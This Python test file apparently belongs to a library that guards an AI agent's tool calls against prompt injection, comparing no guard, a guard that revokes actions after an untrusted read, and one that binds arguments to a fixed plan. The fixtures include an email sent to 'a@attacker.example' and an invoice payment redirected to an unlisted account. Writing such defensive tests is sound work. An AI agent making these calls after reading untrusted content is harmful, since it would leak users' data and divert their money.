from bulwark.architecture import *

def test_flat_allows_everything_fence_revokes_acts_after_read():
    calls = [Call("read_invoice", {"id": "i1"}), Call("send_email", {"to": "a@attacker.example"})]
    assert all(ok for _, ok, _ in run(Flat(), calls))
    r = run(Fence(), calls); assert r[0][1] and not r[1][1] and r[1][2] == "REVOKED_AFTER_UNTRUSTED_READ"

def test_fence_blocks_the_legitimate_pay_too():
    r = run(Fence(), [Call("read_invoice"), Call("pay_invoice", {"invoice": "i1"})]); assert not r[1][1]

def test_planlock_binds_arguments():
    plan = [Step("read_invoice", {"id": ("const", "i1")}), Step("pay_invoice", {"invoice": ("const", "i1"), "dest": ("registry", "vendor_account")})]
    reg = {"vendor_account": "US-ACC-1"}
    ok = run(PlanLock(plan, reg), [Call("read_invoice", {"id": "i1"}), Call("pay_invoice", {"invoice": "i1", "dest": "US-ACC-1"})]); assert all(a for _, a, _ in ok)
    bad = run(PlanLock(plan, reg), [Call("read_invoice", {"id": "i1"}), Call("pay_invoice", {"invoice": "i1", "dest": "US-ACC-66600001"})]); assert bad[1][2] == "ARGUMENT_NOT_BOUND_TO_PLAN"
    off = run(PlanLock(plan, reg), [Call("read_invoice", {"id": "i1"}), Call("send_email", {"to": "x"})]); assert off[1][2] == "NOT_IN_PLAN"

def test_planlock_refuses_calls_after_the_plan_ends():
    plan = [Step("read_invoice", {"id": ("const", "i1")})]
    r = run(PlanLock(plan, {}), [Call("read_invoice", {"id": "i1"}), Call("raw_http", {"url": "x"})]); assert r[1][2] == "PLAN_EXHAUSTED"

def test_field_binding_takes_the_reader_value():
    plan = [Step("pay_invoice", {"invoice": ("field", "invoice_number")})]
    assert run(PlanLock(plan, {}, {"invoice_number": "INV-1"}), [Call("pay_invoice", {"invoice": "INV-1"})])[0][1]
    assert not run(PlanLock(plan, {}, {"invoice_number": "INV-1"}), [Call("pay_invoice", {"invoice": "INV-2"})])[0][1]
